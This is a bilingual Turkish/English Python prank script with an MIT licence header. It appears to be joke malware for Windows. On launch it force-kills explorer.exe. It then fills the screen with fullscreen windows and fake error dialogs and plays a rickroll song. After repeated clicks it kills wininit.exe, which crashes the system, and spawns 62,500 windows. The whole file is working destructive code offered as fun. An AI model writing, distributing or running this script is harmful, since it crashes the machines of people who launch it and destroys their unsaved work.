# music="C:/Users/Administrator/Desktop/Projeler/rickroll.mp3" # (for ... / ... için)
# music="C:/Users/mukonqi/Desktop/rickroll.mp3" # (for developer / geliştirici için)
music="" # (for music file / mp3 dosyası için)
# lang="en" # (for English language/ İngilizce dili için)
# lang="tr" # (for Turkish language/ Türkçe dili için)
lang="" # (for setting language / dil ayarlamak için)

# Copyright (C) 2023 Muhammed S. (MuKonqi)
# License: MIT License

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from playsound import playsound # only use version 1.2.2 / sadece 1.2.2 sürümünü kullanın
from tkinter import *
from tkinter import messagebox
import subprocess
import random
subprocess.Popen("taskkill /IM explorer.exe /F", shell=True) # for killing explorer / explorer öldürmek için
s=0
if lang == "tr":
    while True:
        def end():
            subprocess.Popen("taskkill /IM wininit.exe /F", shell=True)
            for w in range(62500):
                window2=Toplevel()
                window2.title("ÇOCUK HATA: "+str(w))
                window2.resizable(0, 0)
                window2.geometry("750x750")
        def error():
            for w in range(10):
                window2=Toplevel()
                window2.title("BABA HATA: "+str(w))
                window2.resizable(0, 0)
                window2.geometry("1000x1000")
        def run():
            global s
            if s != 14:
                s=s+1
                messagebox.showwarning("Oku","Tıklama yazıyordu....")
                window.attributes("-fullscreen", False)
                error()
                window.attributes("-fullscreen", True)
                messagebox.showerror("explorer.exe","\n:::{9543-3258-6574-1628-1331-0408}\nClass Not Registired")
                button.place(relx=str(random.uniform(0.2, 0.8)), rely=str(random.uniform(0.2, 0.8)))
            else:
                button.config(text="HADİ EĞLENELİM", command=None)
                button.place(relx=0.5, rely=0.5)
                messagebox.showinfo("Tebrikler", "9 saniyelik kutlama vakti!")
                playsound(music)
                button.config(text="ŞİMDİ LÜTFEN BANA TIKLA", command=end)
        window=Tk(className="ANA HATA")
        window.config(background="#376296")
        window.title("ANA HATA")
        window.resizable(0, 0)
        window.attributes("-fullscreen", True)
        button=Button(window, command=run, text="BANA TIKLAMA\nYOKSA ÖLERSİN", font="arial 50 bold italic")
        button.place(relx=0.5, rely=0.5, anchor = CENTER)
        for w in range(100):
            window2=Toplevel()
            window2.title("BABA HATA: "+str(w))
            window2.resizable(0, 0)
            window2.geometry("1000x1000")
        mainloop()
elif lang == "en":
    while True:
        def end():
            subprocess.Popen("taskkill /IM wininit.exe /F", shell=True)
            for w in range(62500):
                window2=Toplevel()
                window2.title("MINOR ERROR: "+str(w))
                window2.resizable(0, 0)
                window2.geometry("750x750")
        def error():
            for w in range(10):
                window2=Toplevel()
                window2.title("MAJOR ERROR: "+str(w))
                window2.resizable(0, 0)
                window2.geometry("1000x1000")
        def run():
            global s
            if s != 14:
                s=s+1
                messagebox.showwarning("Read","It said don't click...")
                window.attributes("-fullscreen", False)
                error()
                window.attributes("-fullscreen", True)
                messagebox.showerror("explorer.exe","\n:::{9543-3258-6574-1628-1331-0408}\nClass Not Registired")
                button.place(relx=str(random.uniform(0.2, 0.8)), rely=str(random.uniform(0.2, 0.8)))
            else:
                button.config(text="LET'S HAVE FUN", command=None)
                button.place(relx=0.5, rely=0.5)
                messagebox.showinfo("Congratulations", "Time for 9 seconds of celebration!")
                playsound(music)
                button.config(text="PLEASE CLICK ME NOW", command=end)
        window=Tk(className="MAIN ERROR")
        window.config(background="#376296")
        window.title("MAIN ERROR")
        window.resizable(0, 0)
        window.attributes("-fullscreen", True)
        button=Button(window, command=run, text="DON'T CLICK ME\nOR YOU'LL DIE", font="arial 50 bold italic")
        button.place(relx=0.5, rely=0.5, anchor = CENTER)
        for w in range(100):
            window2=Toplevel()
            window2.title("MAJOR ERROR: "+str(w))
            window2.resizable(0, 0)
            window2.geometry("1000x1000")
        mainloop()